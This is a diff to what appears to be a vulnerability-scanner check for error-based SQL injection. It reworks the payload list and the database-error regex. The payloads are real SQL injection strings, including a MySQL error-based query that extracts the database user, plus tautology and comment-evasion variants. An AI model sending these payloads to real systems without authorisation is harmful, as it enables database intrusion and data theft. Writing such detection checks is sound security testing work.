@@ -9,17 +9,18 @@ define:
     issueDetail = "Error-based SQL injection detected. The application reflects database error messages when injected with malformed SQL syntax."
     issueRemediation = "Use parameterized queries or prepared statements. Implement proper input validation and suppress verbose error messages in production."
 
+run for each:
+    payload = "1'||(SeLeCt 0x1 FrOm(SeLeCt cOuNt(*),cOnCaT((SeLeCt uSeR()),0x7e,fLoOr(rAnD(0)*2))x FrOm iNfOrMaTiOn_ScHeMa.tAbLeS gRoUp bY x)a)||'",
+        "1%2527%2520OR%25201%253D1--",
+        "1' OR 1=1-- -",
+        "1%27 OR 1=1--",
+        "1' OR '1'='1"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "1'||(SeLeCt 0x1 FrOm(SeLeCt cOuNt(*),cOnCaT((SeLeCt uSeR()),0x7e,fLoOr(rAnD(0)*2))x FrOm iNfOrMaTiOn_ScHeMa.tAbLeS gRoUp bY x)a)||'"
-            - "1%2527%2520OR%25201%253D1--"
-            - "1'/*!50000oR*/1=1-- -"
-            - "1\u0027 OR 1=1--"
-            - "1' /\*!00000oR\*/ '1'='1"
+        replacing: {payload}
 
-    if {check.response} matches "(SQL syntax|mysql_fetch|ORA-[0-9]|ODBC SQL|PostgreSQL.*ERROR|Microsoft.*ODBC|Unclosed quotation|syntax error at|pg_query|sqlite3\.OperationalError|near \"syntax\")" then
+    if {latest.response.body} matches "(SQL syntax|mysql_fetch|ORA-[0-9]|ODBC SQL|PostgreSQL|Unclosed quotation|syntax error at|pg_query|sqlite3|OperationalError|near .syntax.)" then
         report issue:
             severity: high
             confidence: firm
